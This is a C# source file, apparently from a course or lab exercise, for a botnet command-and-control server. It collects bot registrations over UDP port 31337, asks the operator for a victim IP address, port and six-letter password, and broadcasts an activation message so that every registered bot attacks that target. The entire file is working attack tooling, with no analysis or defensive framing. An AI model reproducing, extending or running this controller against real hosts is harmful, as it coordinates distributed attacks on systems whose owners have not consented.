using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace CAC
{
    class Program
    {
        String name = "CKingiot".PadRight(32);
        List<KeyValuePair<IPAddress, int>> botsList = new List<KeyValuePair<IPAddress, int>>();
        public String getName()
        {
            return this.name;
        }
        public void serverListener()
        {
            Console.WriteLine("Command and control server " + name + " active");
            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 31337);
            UdpClient newSockForListening = new UdpClient(ipep);

            while (true)
            {
                try
                {
                    int port;
                    byte[] data = newSockForListening.Receive(ref ipep);
                    port = BitConverter.ToUInt16(data, 0);
                    KeyValuePair<IPAddress, Int32> newBot = new KeyValuePair<IPAddress, int>(ipep.Address, port);
                    if (!botsList.Contains(newBot))
                        botsList.Add(newBot);
                }
                catch
                {
                    continue;
                }
               

            }

        }

        public void getUserInfo()
        {
            String ip = "";
            String portNum = "";
            String pass = "";
            try
            {
                while (ip.Equals(""))
                {
                    Console.WriteLine("enter a victim IP:");
                    ip = Console.ReadLine();
                    if (((ip == "") || (ip.Split('.').Length - 1) != 3))
                    {

                        Console.WriteLine("unvalid ip");
                        ip = "";
                        continue;
                    }
                    string[] numbers = ip.Split('.');
                    foreach (string x in numbers)
                    {
                        if (x.Length > 3)
                        {
                            Console.WriteLine("unvalid ip");
                            ip = "";
                        }
                    }
                    try
                    {
                        IPAddress.Parse(ip);
                    }
                    catch
                    {
                        Console.WriteLine("unvalid ip");
                    }

                }
                while (portNum.Equals(""))
                {
                    Console.WriteLine("enter a victim port:");
                    portNum = Console.ReadLine();
                    foreach (char x in portNum)
                    {
                        if (!(char.IsDigit(x)))
                        {
                            Console.WriteLine("unvalid port numper");
                            break;
                        }
                    }
                    if ((portNum == "") || (portNum.Length == 0))
                    {
                        Console.WriteLine("unvalid port numper");
                        portNum = "";
                    }

                }
                while (pass.Equals(""))
                {
                    Console.WriteLine("enter a victim passward with 6 chars from a-z:");
                    pass = Console.ReadLine();
                    if (pass.Length != 6)
                    {
                        Console.WriteLine("pleas enter a valid password");
                        pass = "";
                        continue;
                    }
                    //if(!pass.Equals(""))
                    foreach (char i in pass)
                    {
                        if (char.IsDigit(i) || i < 'a')
                        {
                            Console.WriteLine("pleas enter a valid password");
                            pass = "";
                            break;
                        }
                    }
                }
                Console.WriteLine("attacking victim on IP " + ip + ", port " + portNum + " with " + botsList.Count + " bots");
                sendActivateMessage(ip, portNum, pass);
            }
            catch
            {

            }
        }
    
           
        public void sendActivateMessage(String ip, String port, String password)
        {
            try
            {
                UdpClient tosend = new UdpClient();
                byte[] messege = new byte[44];
                Array.Copy(IPAddress.Parse(ip).GetAddressBytes(), 0, messege, 0, IPAddress.Parse(ip).GetAddressBytes().Length);
                UInt16 tempPort = UInt16.Parse(port.ToString());
                byte[] vPort = (BitConverter.GetBytes(tempPort));
                messege[4] = vPort[0];
                messege[5] = vPort[1];
                Array.Copy(Encoding.ASCII.GetBytes(password), 0, messege, 6, Encoding.ASCII.GetBytes(password).Length);
                Array.Copy(Encoding.ASCII.GetBytes(name), 0, messege, 12, Encoding.ASCII.GetBytes(name).Length);
                foreach (var x in botsList)
                {
                    IPEndPoint ipep = new IPEndPoint(x.Key, x.Value);
                    tosend.Send(messege, messege.Length, ipep);
                }
            }
            catch
            {

            }
            
        }

        
        static void Main(string[] args)
        {
            Program cac = new Program();
            Thread t1 = new Thread(() => cac.serverListener());
            Thread t2 = new Thread(() => cac.getUserInfo());
            t1.Start();
            t2.Start();
        }
    }
}
